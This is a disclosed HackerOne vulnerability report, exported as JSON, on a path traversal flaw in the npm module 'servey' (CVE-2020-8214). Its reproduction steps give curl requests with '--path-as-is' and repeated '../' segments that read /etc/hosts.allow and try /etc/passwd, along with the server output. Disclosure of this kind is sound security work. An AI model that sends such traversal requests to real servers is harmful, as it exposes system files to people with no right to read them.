{
  "id": 355501,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTU1MDE=",
  "url": "https://hackerone.com/reports/355501",
  "title": "[servey] Path Traversal allows to retrieve content of any file with extension from remote server",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-05-21T13:15:10.580Z",
  "submitted_at": "2018-05-21T13:15:10.580Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2020-8214"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-04-03T20:08:41.745Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-03-04T20:08:38.881Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Team,\n\nI would like to report a partial Path Traversal in ```servey``` module.\nIt allows to read content of any arbitrary file (with extension) from the server.\n\n## Module\n\n**module name:** servey\n**version:** 2.2.0\n**npm page:** https://www.npmjs.com/package/servey\n\n### Module Description\n\nA static & single page application server.\n\n### Module Stats\n\n~120-200 downloads/month (estimated)\n\n## Vulnerability Description\n\n\n\n## Steps To Reproduce:\n\n- Install ```servey``` module:\n\n```\n$ npm install servey\n```\n\n- create sample application following an example from module's npm doc:\n\n```javascript\n// app.js\nconst Servey = require('servey');\nconst Path = require('path') \nconst server = Servey.create({\n    spa: true,\n    port: 8080,\n    folder: Path.join(__dirname, 'static')\n});\n\nserver.on('error', function (error) {\n    console.error(error);\n});\n\nserver.on('request', function (req) {\n    console.log(req.url);\n});\n\nserver.on('open', function () {\n    console.log('open');\n});\n\nserver.open();\n```\n\n- run app:\n\n```\n$ node app.js \nopen\n\n```\n\n\n- try to retrieve content of ```/etc/passwd``` (an example file without any extension). ```servey``` does not allow to open such file and throws HTTP 500 Internal Server Error:\n\n```\n$ curl -v --path-as-is localhost:8080/../../../../../../etc/passwd\n*   Trying ::1...\n* connect to ::1 port 8080 failed: Connection refused\n*   Trying 127.0.0.1...\n* Connected to localhost (127.0.0.1) port 8080 (#0)\n> GET /../../../../../../etc/passwd HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 500 Internal Server Error\n< Content-Type: text/html; charset=utf8\n< Date: Mon, 21 May 2018 13:08:15 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \n* Connection #0 to host localhost left intact\n{\"code\":500,\"message\":\"Internal Server Error\"}\n\n```\n\n- verify logs that request failed:\n\n```\n$ node app.js \nopen\n/../../../../../../etc/passwd\n{ Error: ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/node/static/index.html'\n  errno: -2,\n  code: 'ENOENT',\n  syscall: 'open',\n  path: '/home/rafal.janicki/playground/hackerone/node/static/index.html' }\n```\n\n\n- now, try to execute following curl command to retrieve content of ```/etc/hosts.allow``` (adjust amount of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is localhost:8080/../../../../../../etc/hosts.allow\n*   Trying ::1...\n* connect to ::1 port 8080 failed: Connection refused\n*   Trying 127.0.0.1...\n* Connected to localhost (127.0.0.1) port 8080 (#0)\n> GET /../../../../../../etc/hosts.allow HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Content-Type: undefined; charset=utf8\n< Date: Mon, 21 May 2018 13:06:38 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \n# /etc/hosts.allow: list of hosts that are allowed to access the system.\n#                   See the manual pages hosts_access(5) and hosts_options(5).\n#\n# Example:    ALL: LOCAL @some_netgroup\n#             ALL: .foobar.edu EXCEPT terminalserver.foobar.edu\n#\n# If you're going to protect the portmapper use the name \"rpcbind\" for the\n# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.\n#\n\n* Connection #0 to host localhost left intact\n\n```\n\n- check ```servey``` app logs again:\n\n```\n$ node app.js \nopen\n/../../../../../../etc/passwd\n{ Error: ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/node/static/index.html'\n  errno: -2,\n  code: 'ENOENT',\n  syscall: 'open',\n  path: '/home/rafal.janicki/playground/hackerone/node/static/index.html' }\n/../../../../../../etc/hosts.allow\n\n```\n\nYou can see ```hosts.allow``` requets did not fail and the content of the file was retrieved.\n\n\n## Patch\n\nN/A\n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.11.1\n- npm v. 6.0.1\n- curl 7.47.0\n\n## Wrap up\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nAn attacker is able to retrieve content of any file with extension from remote server.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-04-03T20:08:38.987Z",
  "allow_singular_disclosure_after": -153507346.98407745,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "foobar7"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18767,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "servey",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
